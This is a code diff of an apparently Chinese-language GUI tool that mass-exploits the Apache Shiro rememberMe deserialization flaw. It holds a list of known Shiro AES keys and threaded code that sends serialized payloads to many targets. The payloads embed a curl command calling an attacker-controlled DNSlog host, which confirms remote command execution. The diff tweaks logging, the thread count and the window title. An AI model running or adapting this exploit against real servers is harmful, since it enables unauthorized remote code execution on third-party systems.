@@ -4,9 +4,9 @@ import base64
 import uuid
 import subprocess
 from Crypto.Cipher import AES
-import threading
 import urllib3
 import re
+from tkinter.messagebox import *
 import requests
 import tkinter as tk
 from tkinter import scrolledtext
@@ -119,33 +119,27 @@ keys = ['kPH+bIxk5D2deZiIxcaaaA==',
 'GAevYnznvgNCURavBhCr1w==',
 '66v1O8keKNV3TTcGPK1wzg==',
 'SDKOLKn2J1j/2BHjeZwAoQ==']
-
-
-
 def shiro_poc(url):
-    dnslog = shiro_text.get()
+    dnslog = shiro_entry.get()
     target = url.strip()
     r = requests.get(target, cookies={'rememberMe': '1'}, timeout=3, verify=False, allow_redirects=False)  # 发送验证请求
     if 'deleteMe' not in r.headers['Set-Cookie']:
         shiro_text.insert(END,"【-】没有启用rememberMe--" + target + "\n")
         shiro_text.see(END)
         return False
+    showinfo("程序开始运行！","请关注您的dnslog/ceye！")
+    shiro_text.insert(END, "【+】程序开始运行！请关注您的dnslog/ceye！\n")
+    shiro_text.see(END)
     for plugin in plugins:
         for key in keys:
             ip = ip_line_regex.search(target).group()
             #en_ip = base64.b64encode(ip.encode('utf-8')).decode()
             en_ip = ip.replace('.','_')
-            emae = ('curl http://'+ plugin + '.' + key + '.' + en_ip + '.')
+            emae = ('curl http://' + plugin + '.' + key + '.' + en_ip + '.')
             try:
                 payload = generator(JAR_FILE,plugin,key,emae+dnslog)  # 生成payload
-                shiro_text.insert(END, "【+】payload为：" + payload.decode() + "\n")
-                shiro_text.see(END)
                 r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=2,verify=False)  # 发送验证请求
-                shiro_text.insert(END, "【+】成功发送数据包--" + target + "\n")
-                shiro_text.see(END)
             except:
-                shiro_text.insert(END, "【-】发送数据包失败--" + target + "\n")
-                shiro_text.see(END)
                 break
     return False
 
@@ -170,15 +164,15 @@ def get_shiro_addr():
             yield address
 def thread_shiro():
     addrs = get_shiro_addr()
-    max_thread_num = 30
+    max_thread_num = 10
     executor = ThreadPoolExecutor(max_workers=max_thread_num)
     for addr in addrs:
         future = executor.submit(shiro_poc, addr)
 def shiro_gui():
-    global shiro_text
+    global shiro_entry
     shiroGui = tk.Tk()
     shiroGui.geometry("910x450")
-    shiroGui.title("用友 NC bsh.servlet.BshServlet 远程命令执行漏洞一把梭")
+    shiroGui.title("shiro漏洞一把梭")
     shiroGui.resizable(0, 0)
     shiroGui.iconbitmap('logo.ico')
     global shiro_text
